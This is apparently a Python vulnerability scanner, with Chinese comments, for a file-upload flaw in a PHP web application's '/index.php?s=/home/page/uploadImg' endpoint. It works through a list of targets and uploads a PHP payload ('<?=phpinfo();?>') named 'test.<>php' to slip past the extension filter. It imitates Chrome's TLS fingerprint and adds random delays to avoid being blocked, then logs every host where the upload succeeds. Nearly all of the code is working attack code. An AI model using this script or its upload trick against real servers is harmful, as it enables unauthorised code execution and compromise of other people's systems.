import time
import random
import sys
import json

try:
    from curl_cffi import CurlMime, requests
except ImportError:
    print("[!] 错误: 未检测到 'curl_cffi' 库。请运行: pip install curl_cffi")
    sys.exit(1)


def check_vulnerability(target_url):
    target_url = target_url.strip()
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    target_url = target_url.rstrip("/")

    # 常见测试接口路径
    endpoints = [
        "/index.php?s=/home/page/uploadImg",
        # "/server/index.php?s=/home/page/uploadImg"
    ]

    # 高仿真请求头（注意：此处绝对不能包含 "Content-Type"）
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        # "X-Requested-With": "XMLHttpRequest",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        # "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        # "Sec-Ch-Ua-Mobile": "?0",
        # "Sec-Ch-Ua-Platform": '"Windows"',
        # "Sec-Fetch-Dest": "empty",
        # "Sec-Fetch-Mode": "cors",
        # "Sec-Fetch-Site": "same-origin",
    }

    print(f"[*] 开始检测目标: {target_url}")

    for path in endpoints:
        full_url = target_url + path

        delay_time = round(random.uniform(0.5, 1.5), 2)
        print(f"[*] 正在等待 {delay_time} 秒以防拦截...")
        time.sleep(delay_time)

        print(f"[*] 正在尝试请求接口: {full_url}")

        try:
            # 使用 curl_cffi 的 CurlMime 构建 multipart 数据
            mp = CurlMime()
            mp.addpart(
                name="editormd-image-file",
                filename="test.<>php",
                content_type="text/plain",
                data=b"<?=phpinfo();?>"
            )

            response = requests.post(
                url=full_url,
                headers=headers,
                multipart=mp,  # 使用修改后的参数
                impersonate="chrome119",
                verify=False,
                timeout=15
            )

            # 显式关闭 CurlMime 释放内存
            mp.close()

            print(f"[*] 接口返回状态码: {response.status_code}")

            if response.status_code == 200:
                try:
                    res_json = response.json()
                    # 漏洞研判：依据响应包的 success 字段与返回的 URL 路径进行判断
                    if res_json.get("success") == 1 and "url" in res_json:
                        print(f"\n[+] 【检测到指标】: 成功上传测试文件！")
                        print(f"    - 响应 JSON: {json.dumps(res_json, ensure_ascii=False)}")
                        print(f"    - 文件路径: {res_json.get('url')}\n")
                        with open("../output/cve-output.txt","a") as f:
                            f.write(f"URL: {target_url}\n路径: {res_json.get('url')}\n")
                        return True
                except ValueError:
                    # 返回非 JSON 格式
                    pass

            print(f"[-] 接口 {path} 未返回有效漏洞指标。")

        except Exception as e:
            print(f"[!] 请求 {full_url} 时发生异常: {e}")
            continue

    print("\n[-] 检测完成。\n")
    return False


if __name__ == "__main__":
    # if len(sys.argv) > 1:
    #     target = sys.argv[1]
    # else:
    #     target = input("请输入测试目标 URL (例如 http://192.168.43.8:8080): ")

    with open("../sources/cve-target.txt","r") as f:
        for line in f.readlines():
            check_vulnerability(line)